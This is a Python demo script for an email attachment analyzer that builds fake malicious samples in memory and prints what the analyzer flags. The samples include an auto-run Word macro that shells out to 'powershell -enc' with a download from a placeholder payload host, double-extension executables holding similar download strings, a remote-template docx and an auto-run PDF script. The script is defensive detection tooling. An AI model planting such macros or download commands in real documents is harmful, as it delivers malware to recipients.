"""Keyless demo of the attachment analyzer -- no accounts, no API keys, no internet.

    python scripts/demo.py          (or double-click demo.bat)

It builds a handful of HARMLESS fake attachments in memory (a fake program
that is just a few bytes of padding, a Word file with a made-up macro as plain
text, and so on), runs them through the same analyzer the real pipeline uses,
and prints what it found. Nothing is written to disk, uploaded, opened or run.
"""
import os
import sys

_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, _ROOT)

if hasattr(sys.stdout, "reconfigure"):  # old Windows consoles choke on unusual characters
    sys.stdout.reconfigure(errors="replace")

if sys.version_info < (3, 10):
    sys.exit("This needs Python 3.10 or newer. See docs/SETUP_GUIDE.md, step 1.")

from src.attachments import analyze_attachments  # noqa: E402
from src.attachments.models import RawAttachment  # noqa: E402
from tests.support import make_docx, make_pdf, make_pe, make_zip  # noqa: E402

_PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64

_MACRO = (
    'Sub AutoOpen()\r\n'
    '  Dim s As String\r\n'
    '  s = "powershell -enc AAAA http://payload.example.invalid/stage2.bin"\r\n'
    '  Shell s\r\n'
    'End Sub'
)

# (what it is, file name, bytes, email body shown to the analyzer, what to notice)
SAMPLES = [
    ("A normal-looking PDF", "meeting-notes.pdf",
     make_pdf("1 0 obj << /Type /Page >> endobj"), "",
     "A boring PDF. The analyzer finds nothing - which still isn't proof it is safe."),
    ("A photo", "holiday.png", _PNG, "",
     "Plain images are recognised and skipped quickly."),
    ("A program pretending to be a PDF", "invoice.pdf.exe",
     make_pe(b"powershell -enc AAAA http://payload.example.invalid/dropper.bin\x00"), "",
     "Double extension: Windows hides the last part, so you'd see 'invoice.pdf'."),
    ("A Word file with an auto-run macro", "Quarterly-Report.docm",
     make_docx(macro_source=_MACRO), "",
     "The analyzer reads the macro text and spots the auto-run, shell and download parts."),
    ("A Word file that fetches a template from the internet", "offer-letter.docx",
     make_docx(external_rels=[("attachedTemplate", "http://templates.example.invalid/t.dotm")]), "",
     "No macro inside - the danger is loaded from a web address when you open it."),
    ("A PDF that runs JavaScript when opened", "statement.pdf",
     make_pdf("1 0 obj << /OpenAction << /S /JavaScript /JS (app.alert\\(1\\)) >> >> endobj"), "",
     "Auto-running scripts in a PDF are rare in real documents."),
    ("A ZIP hiding a program, with the password in the email", "scan-2024.zip",
     make_zip({"scan.pdf.exe": make_pe(b"cmd /c start http://payload.example.invalid/x\x00")},
              flag_encrypted={"scan.pdf.exe"}),
     "Please see the attached scan. The password is 1234.",
     "Encrypted ZIP + 'password' in the email is a classic way to sneak past antivirus."),
]

_VERDICT = {
    "none": "no red flags found (not proof of safety)",
    "low": "LOW risk - minor oddities",
    "medium": "MEDIUM risk - suspicious",
    "high": "HIGH RISK - treat as malicious until proven otherwise",
}


def _show(index, total, title, filename, report, hint):
    entry = report["files"][0]
    print("-" * 70)
    print(f"[{index}/{total}] {title}")
    print(f"      File: {filename}   ({entry.get('description', '?')}, {entry.get('size', 0)} bytes)")
    print(f"      Verdict: {_VERDICT.get(report['static_risk'], report['static_risk'])}")
    print(f"      SHA-256: {entry.get('sha256', '?')[:32]}...   (this is what gets looked up on VirusTotal)")
    signals = list(report["email_signals"]) + list(entry.get("signals", []))
    for member in entry.get("members", []):
        signals += [dict(s, detail=f"inside {member.get('filename')}: {s['detail']}") for s in member.get("signals", [])]
    for sig in sorted(signals, key=lambda s: ["high", "medium", "low"].index(s["severity"]) if s["severity"] in ("high", "medium", "low") else 3)[:6]:
        print(f"        [{sig['severity'].upper():6}] {sig['detail']}")
    if entry.get("urls"):
        print(f"      Links found inside: {', '.join(entry['urls'][:3])}")
    print(f"      Why this sample: {hint}")


def main():
    print("=" * 70)
    print(" Alert Enrichment - attachment analyzer demo")
    print(" Harmless fake files, built in memory. No internet, no keys needed.")
    print("=" * 70)
    for i, (title, name, data, body, hint) in enumerate(SAMPLES, start=1):
        report = analyze_attachments([RawAttachment(name, "", data, len(data))], body)
        _show(i, len(SAMPLES), title, name, report, hint)
    print("-" * 70)
    print("\nIn real use, the pipeline also:")
    print("  - looks each file's SHA-256 up on VirusTotal (a lookup only; nothing is uploaded)")
    print("  - checks links found inside the files like any other link in the email")
    print("  - gives all of this to Claude, which writes the final verdict and advice")
    print("\nReady for the real thing? Double-click setup.bat (it guides you step by step).")


if __name__ == "__main__":
    main()
